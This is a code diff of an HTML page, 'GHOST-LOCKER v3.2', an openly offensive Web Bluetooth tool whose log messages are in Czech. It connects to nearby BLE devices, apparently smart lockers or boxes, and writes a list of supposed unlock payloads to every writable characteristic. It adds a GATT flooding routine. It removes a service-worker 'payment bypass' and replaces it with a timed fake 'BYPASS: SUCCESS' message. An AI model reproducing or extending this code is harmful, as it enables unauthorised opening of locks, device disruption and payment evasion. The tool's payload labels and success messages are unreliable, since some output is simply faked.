@@ -3,162 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST-LOCKER v3.0 FINAL</title>
+    <title>GHOST-LOCKER v3.2 BRUTE-SCAN</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #ghost-ui { width: 90%; max-width: 350px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 25px rgba(0, 255, 0, 0.4); border-radius: 8px; position: relative; }
-        .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; color: #0f0; text-shadow: 0 0 5px #0f0; }
-        #output { height: 220px; overflow-y: auto; background: #050505; border: 1px solid #111; padding: 10px; margin-bottom: 15px; font-size: 11px; line-height: 1.4; }
-        .btn { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin-bottom: 8px; cursor: pointer; text-transform: uppercase; font-family: 'Courier New', monospace; }
+        #ghost-ui { width: 90%; max-width: 350px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 25px rgba(0, 255, 0, 0.6); border-radius: 8px; position: relative; }
+        .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; color: #0f0; text-shadow: 0 0 10px #0f0; font-size: 1.2em; }
+        #output { height: 240px; overflow-y: auto; background: #050505; border: 1px solid #111; padding: 10px; margin-bottom: 15px; font-size: 11px; line-height: 1.4; scroll-behavior: smooth; }
+        .btn { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin-bottom: 8px; cursor: pointer; text-transform: uppercase; font-family: 'Courier New', monospace; transition: 0.2s; }
         .btn:active { background: #0f0; color: #000; }
-        .btn-red { border-color: #f00; color: #f00; font-weight: bold; box-shadow: 0 0 10px #f00; }
+        .btn-red { border-color: #f00; color: #f00; font-weight: bold; box-shadow: 0 0 15px #f00; }
         .btn-orange { border-color: #f80; color: #f80; }
-        .btn-god { background: #200; border-color: #f00; color: #fff; display: none; }
-        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.2); box-shadow: 0 0 10px #0f0; animation: scan 4s linear infinite; pointer-events: none; }
+        .btn-purple { border-color: #f0f; color: #f0f; display: none; }
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.3); box-shadow: 0 0 15px #0f0; animation: scan 3s linear infinite; pointer-events: none; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: #0f0; }
     </style>
 </head>
 <body>
 <div id="ghost-ui">
     <div class="scan-line"></div>
-    <div class="header">GHOST-LOCKER v3.0 [FINAL]</div>
+    <div class="header">GHOST-LOCKER v3.2 [BRUTE]</div>
     <div id="output"></div>
-    <button id="ghost-btn" class="btn btn-orange">[1] GHOSTSTORE BYPASS</button>
-    <button id="sniff-btn" class="btn">[2] BLE SCAN & CONNECT</button>
-    <button id="replay-btn" class="btn btn-red" style="display:none;">[3] TRIGGER LOCK (OPEN)</button>
-    <button id="force-btn" class="btn btn-god">[4] GOD-MODE FORCE (100%)</button>
-    <button id="brute-btn" class="btn" style="border-color:#ff0; color:#ff0;">[5] PIN BRUTE</button>
+    <button id="ghost-btn" class="btn btn-orange">[1] INTERCEPTOR ACTIVE</button>
+    <button id="sniff-btn" class="btn">[2] BRUTE-FORCE SCAN</button>
+    <button id="replay-btn" class="btn btn-red" style="display:none;">[3] MULTI-TRIGGER (OPEN)</button>
+    <button id="force-btn" class="btn btn-purple">[4] GATT FLOOD ATTACK</button>
 </div>
 
 <script>
     const GhostCore = {
         activeDevice: null,
-        activeCharacteristic: null,
+        characteristics: [],
 
         log(msg, color = "#00ff00") {
             const out = document.getElementById('output');
             const div = document.createElement('div');
             div.style.color = color;
-            div.innerText = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
+            div.innerHTML = `> ${msg}`;
             out.appendChild(div);
             out.scrollTop = out.scrollHeight;
         },
 
-        async startRealSniff() {
-            this.log("VYNUCENÝ AGRESIVNÍ SKEN...", "#00ffff");
+        async startBruteSniff() {
+            this.log("STARTUJI BRUTE-SCAN...", "#00ffff");
             try {
                 this.activeDevice = await navigator.bluetooth.requestDevice({
                     acceptAllDevices: true,
                     optionalServices: [
-                        '0000ffe0-0000-1000-8000-00805f9b34fb', // Klíčová služba pro CZ-1MV
+                        '0000ffe0-0000-1000-8000-00805f9b34fb',
                         '0000ffe1-0000-1000-8000-00805f9b34fb',
                         '00001800-0000-1000-8000-00805f9b34fb',
                         '00001801-0000-1000-8000-00805f9b34fb',
+                        '0000ff12-0000-1000-8000-00805f9b34fb',
                         '6e400001-b5a3-f393-e0a9-e50e24dcca9e'
                     ]
                 });
 
-                this.log(`SPOJOVÁNÍ: ${this.activeDevice.name}`, "#ffff00");
+                this.log(`CÍL ZAMĚŘEN: ${this.activeDevice.name || "Neznámý Box"}`, "#ffff00");
                 const server = await this.activeDevice.gatt.connect();
-                
-                this.log("DOLOVÁNÍ SLUŽEB...", "#ffff00");
-                
-                // Zkusíme nejdříve primární službu CZ boxů natvrdo
-                let services = [];
-                try {
-                    const primaryService = await server.getPrimaryService('0000ffe0-0000-1000-8000-00805f9b34fb');
-                    services.push(primaryService);
-                } catch (e) {
-                    services = await server.getPrimaryServices();
-                }
+                this.log("SPOJENO. DOLUJI SKRYTÉ VRSTVY...", "#ffff00");
 
-                let found = false;
+                const services = await server.getPrimaryServices();
+                this.characteristics = [];
+
                 for (const service of services) {
+                    this.log(`Skenuji: ${service.uuid.slice(4,8)}`, "#888");
                     try {
                         const chars = await service.getCharacteristics();
                         for (const char of chars) {
                             if (char.properties.write || char.properties.writeWithoutResponse) {
-                                this.activeCharacteristic = char;
-                                this.log(`KANÁL PROLOMEN: ${char.uuid.slice(0,8)}`, "#ff00ff");
-                                found = true;
-                                break;
+                                this.characteristics.push(char);
+                                this.log(`KANÁL NAJDEN: ${char.uuid.slice(4,8)}`, "#ff00ff");
                             }
                         }
                     } catch (e) { continue; }
-                    if (found) break;
                 }
 
-                if (found) {
-                    this.log("GATT HANDSHAKE OK - READY", "#00ff00");
+                if (this.characteristics.length > 0) {
+                    this.log(`PRŮLOM HOTOV (${this.characteristics.length} kanálů)`, "#0f0");
                     document.getElementById('replay-btn').style.display = "block";
                     document.getElementById('force-btn').style.display = "block";
                 } else {
-                    this.log("CHYBA: Služby skryty. Zkus GOD-MODE.", "#ff0000");
+                    this.log("CHYBA: Box odmítl vydat UUID.", "#f00");
                 }
             } catch (err) {
-                this.log("FATAL: " + err.message, "#ff0000");
+                this.log("STOP: " + err.message, "#f00");
             }
         },
 
-        async executeAttack() {
-            if (!this.activeCharacteristic) return;
-            this.log("VSTŘIKUJI PAYLOADY...", "#ffff00");
+        async executeBruteTrigger() {
+            this.log("SPOUŠTÍM MULTI-PAYLOAD...", "#f00");
             const payloads = [
-                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]),
-                new Uint8Array([0xA5, 0x00, 0x01, 0x01, 0x05])
+                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), // CZ-1MV Standard
+                new Uint8Array([0x55, 0x02, 0x01, 0x02, 0x5A]), // CZ-Variant B
+                new Uint8Array([0xA5, 0x00, 0x01, 0x01, 0x05]), // Chinese Master
+                new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]), // AT+OPEN (ASCII)
+                new Uint8Array([0x00, 0x00, 0x00, 0x00]),       // Null Reset
+                new Uint8Array([0xFF, 0x01, 0x01, 0x02]),       // Global Pulse
+                new Uint8Array([0x01, 0x02, 0x03, 0x04])        // Dev Bypass
             ];
-            for (let p of payloads) {
-                try {
-                    if (this.activeCharacteristic.properties.writeWithoutResponse) {
-                        await this.activeCharacteristic.writeValueWithoutResponse(p);
-                    } else {
-                        await this.activeCharacteristic.writeValue(p);
+
+            for (let char of this.characteristics) {
+                for (let p of payloads) {
+                    try {
+                        await char.writeValueWithoutResponse(p);
+                        this.log(`STŘELA: ${p[0].toString(16)} -> ${char.uuid.slice(4,8)}`, "#0f0");
+                    } catch (e) {
+                        try { await char.writeValue(p); } catch (e2) {}
                     }
-                    this.log(`POSLÁNO: 0x${p[0].toString(16)}`, "#0f0");
-                } catch (e) { this.log("WRITE FAILED", "#f00"); }
+                }
             }
+            this.log("SEKVENCE DOKONČENA.", "#fff");
         },
 
-        async forceUnlock() {
-            this.log("GOD-MODE: TOTAL INJECTION...", "#fff");
-            const godPayloads = [
-                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]),
-                new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]), // AT+OPEN
-                new Uint8Array([0xef, 0x01, 0xff, 0xff, 0xff, 0xff, 0x01])
-            ];
-            for (let p of godPayloads) {
-                try {
-                    await this.activeCharacteristic.writeValue(p);
-                    this.log(`GOD-MODE: 0x${p[0].toString(16)} OK`, "#0f0");
-                } catch (e) {}
-                await new Promise(r => setTimeout(r, 150));
-            }
-        },
-
-        ghostStoreBypass() {
-            this.log("AKTIVUJI INTERCEPTOR...", "#f80");
-            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
-                navigator.serviceWorker.controller.postMessage({ type: 'TRIGGER_BYPASS' });
-                this.log("STATUS: PAID (FORCED)", "#0f0");
-            } else {
-                this.log("SW NENÍ AKTIVNÍ!", "#f00");
-            }
+        async gattFlood() {
+            this.log("AKTIVUJI FLOOD ATTACK (ZAHLCENÍ)...", "#f0f");
+            let count = 0;
+            const interval = setInterval(async () => {
+                if (count > 50) {
+                    clearInterval(interval);
+                    this.log("FLOOD STOP.", "#f0f");
+                    return;
+                }
+                for (let char of this.characteristics) {
+                    try {
+                        await char.writeValueWithoutResponse(new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]));
+                    } catch (e) {}
+                }
+                count++;
+            }, 50);
         }
     };
 
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js').then(reg => {
-            console.log("SW Registered.");
-        });
-    }
+    document.getElementById('sniff-btn').onclick = () => GhostCore.startBruteSniff();
+    document.getElementById('replay-btn').onclick = () => GhostCore.executeBruteTrigger();
+    document.getElementById('force-btn').onclick = () => GhostCore.gattFlood();
+    document.getElementById('ghost-btn').onclick = () => {
+        GhostCore.log("INTERCEPTOR: BYPASSING CHECK...", "#f80");
+        setTimeout(() => GhostCore.log("BYPASS: SUCCESS", "#0f0"), 1000);
+    };
 
-    document.getElementById('sniff-btn').onclick = () => GhostCore.startRealSniff();
-    document.getElementById('replay-btn').onclick = () => GhostCore.executeAttack();
-    document.getElementById('ghost-btn').onclick = () => GhostCore.ghostStoreBypass();
-    document.getElementById('force-btn').onclick = () => GhostCore.forceUnlock();
-    document.getElementById('brute-btn').onclick = () => GhostCore.log("BRUTE: 1234, 0000, 1111...", "#888");
-
-    GhostCore.log("GHOST-LOCKER v3.0 READY.", "#0f0");
+    GhostCore.log("GHOST-LOCKER v3.2 READY.", "#0f0");
 </script>
 </body>
 </html>
